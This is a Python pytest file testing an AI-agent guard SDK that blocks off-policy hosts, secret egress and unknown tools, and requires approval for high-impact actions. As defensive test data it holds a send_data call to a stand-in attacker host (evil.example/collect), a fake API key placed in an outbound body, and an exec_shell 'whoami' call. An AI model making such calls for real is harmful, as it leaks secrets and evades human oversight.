"""Tests for the sentinelx-agent-guard SDK (offline, no network)."""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

import pytest
from pydantic import ValidationError
from sentinelx_agent_guard import Guard, GuardBlocked

REPO = Path(__file__).resolve().parents[2]
POLICY_YAML = """\
allowed_hosts:
  - orders.lab.test
allowed_tools:
  - fetch_page
  - read_note
high_impact_actions:
  - send_data
secret_patterns: []
"""
SECRET = "sk-" + "AbCdEfGhIjKlMnOpQrSt"  # fake api-key shape; gateway detects it


@pytest.fixture()
def policy_file(tmp_path: Path) -> Path:
    p = tmp_path / "policy.yaml"
    p.write_text(POLICY_YAML, encoding="utf-8")
    return p


def test_enforce_blocks_off_scope_host_and_tool_not_called(policy_file: Path):
    guard = Guard(policy_file, mode="enforce")
    calls = []

    @guard.tool("send_data")
    def send(url: str, body: str) -> str:
        calls.append((url, body))
        return "sent"

    with pytest.raises(GuardBlocked) as exc:
        send("http://evil.example/collect", "hello")
    assert exc.value.reason_code == "HOST_NOT_ALLOWED"
    assert calls == []  # the tool never ran


def test_enforce_blocks_secret_egress_and_tool_not_called(policy_file: Path):
    guard = Guard(policy_file, mode="enforce")
    calls = []

    @guard.tool("send_data")
    def send(url: str, body: str) -> str:
        calls.append((url, body))
        return "sent"

    with pytest.raises(GuardBlocked) as exc:
        send("http://orders.lab.test/note", f"token={SECRET}")  # allowed host, secret body
    assert exc.value.reason_code == "SECRET_EGRESS"
    assert calls == []


def test_enforce_confirm_uses_approver_and_runs_when_approved(policy_file: Path):
    decisions = []

    def approver(action: dict) -> bool:
        decisions.append(action["tool"])
        return True

    guard = Guard(policy_file, mode="enforce", approver=approver)
    calls = []

    @guard.tool("send_data")
    def send(url: str, body: str) -> str:
        calls.append((url, body))
        return "sent"

    assert send("http://orders.lab.test/note", "hello") == "sent"
    assert decisions == ["send_data"]
    assert calls == [("http://orders.lab.test/note", "hello")]


def test_enforce_confirm_default_approver_rejects(policy_file: Path):
    guard = Guard(policy_file, mode="enforce")  # no approver -> rejects
    calls = []

    @guard.tool("send_data")
    def send(url: str, body: str) -> str:
        calls.append(1)
        return "sent"

    with pytest.raises(GuardBlocked):
        send("http://orders.lab.test/note", "hello")
    assert calls == []


def test_monitor_runs_tool_and_records_would_have_decided(policy_file: Path):
    guard = Guard(policy_file, mode="monitor")
    calls = []

    @guard.tool("send_data")
    def send(url: str, body: str) -> str:
        calls.append((url, body))
        return "sent"

    assert send("http://evil.example/collect", "hello") == "sent"
    assert calls == [("http://evil.example/collect", "hello")]  # ran in monitor mode
    would = [d for d in guard.history if d.would_have_decided is not None
             and d.would_have_decided.value == "BLOCK"]
    assert would and would[0].reason_code == "HOST_NOT_ALLOWED"


def test_unknown_tool_blocked_in_enforce(policy_file: Path):
    guard = Guard(policy_file, mode="enforce")
    decision = guard.check({"tool": "exec_shell", "arguments": {"cmd": "whoami"}})
    assert decision.decision.value == "BLOCK"
    assert decision.reason_code == "UNKNOWN_TOOL"

    calls = []

    @guard.tool("exec_shell")
    def shell(cmd: str) -> str:
        calls.append(cmd)
        return "ran"

    with pytest.raises(GuardBlocked) as exc:
        shell("whoami")
    assert exc.value.reason_code == "UNKNOWN_TOOL"
    assert calls == []


def test_check_returns_gateway_decision_for_allowed_action(policy_file: Path):
    guard = Guard(policy_file, mode="enforce")
    decision = guard.check({"tool": "fetch_page", "arguments": {"url": "http://orders.lab.test/"}})
    assert decision.decision.value == "ALLOW"
    assert decision.reason_code == "SAFE_ALLOWLIST"


def test_invalid_yaml_keys_fail_validation(tmp_path: Path):
    bad = tmp_path / "bad.yaml"
    bad.write_text("allowed_hosts: []\nevil_extra_key: 1\n", encoding="utf-8")
    with pytest.raises(ValidationError):
        Guard(bad, mode="enforce")

    malformed = tmp_path / "malformed.yaml"
    malformed.write_text("allowed_tools: not_a_list\n", encoding="utf-8")
    with pytest.raises(ValidationError):
        Guard(malformed, mode="enforce")

    with pytest.raises(ValueError):
        Guard(tmp_path / "bad.yaml", mode="sideways")


def test_example_script_exits_zero_with_blocked_and_completed():
    result = subprocess.run(
        [sys.executable, str(REPO / "examples" / "agent_guard_basic.py")],
        cwd=REPO, capture_output=True, text=True)
    assert result.returncode == 0, result.stderr
    assert "BLOCKED:" in result.stdout
    assert "COMPLETED:" in result.stdout
    assert "WOULD have been blocked:" in result.stdout
